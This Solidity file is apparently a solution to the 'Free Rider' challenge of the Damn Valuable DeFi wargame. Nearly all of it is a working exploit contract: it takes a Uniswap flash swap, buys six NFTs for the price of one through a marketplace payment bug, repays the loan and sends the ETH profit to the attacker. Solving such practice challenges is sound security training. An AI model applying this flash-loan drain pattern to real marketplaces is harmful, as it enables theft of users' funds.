// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {FreeRiderRecovery} from "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FreeRiderAttack is Test, IERC721Receiver, IUniswapV2Callee {
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;

    FreeRiderRecovery internal freeRiderRecovery;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    WETH9 internal weth;

    address payable internal attacker;
    address payable internal buyer;

    constructor(
        address _freeRiderRecovery,
        address payable _freeRiderNFTMarketplace,
        address _dvt,
        address _damnValuableNFT,
        address _uniswapV2Pair,
        address payable _weth,
        address payable _attacker
    ) payable {
        freeRiderRecovery = FreeRiderRecovery(_freeRiderRecovery);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
        dvt = DamnValuableToken(_dvt);
        damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        weth = WETH9(_weth);
        attacker = _attacker;
    }

    function attack() public {
        // 1. Flash loan ETH from the Uniswap pair
        // Need to pass some data to trigger uniswapV2Call
        uint256 borrowAmount = NFT_PRICE;
        bytes memory data = abi.encode((borrowAmount));

        // amount0Out is DVT, amount1Out is WETH
        uniswapV2Pair.swap(0, borrowAmount, address(this), data);
    }

    function uniswapV2Call(address, uint256, uint256 amount1, bytes calldata data) external {
        // 2. Unwrap ETH
        weth.withdraw(weth.balanceOf(address(this)));

        // 3. Buy NFTs from the marketplace
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }
        uint256 nfts_price = NFT_PRICE;
        freeRiderNFTMarketplace.buyMany{value: nfts_price}(tokenIds);

        // 4. Sell the NFTs to the buyer
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderRecovery), i, abi.encode(address(this)));
        }

        // 5. Repay the flash loan
        // about 0.3% fee, +1 to round up
        uint256 fee = (amount1 * 3) / 997 + 1;
        uint256 amountToRepay = amount1 + fee;
        uint256 amountToWrap = amountToRepay - weth.balanceOf(address(this));
        weth.deposit{value: amountToWrap}();
        weth.transfer(address(uniswapV2Pair), amountToRepay);

        // 7. Return ETH to attacker
        attacker.transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
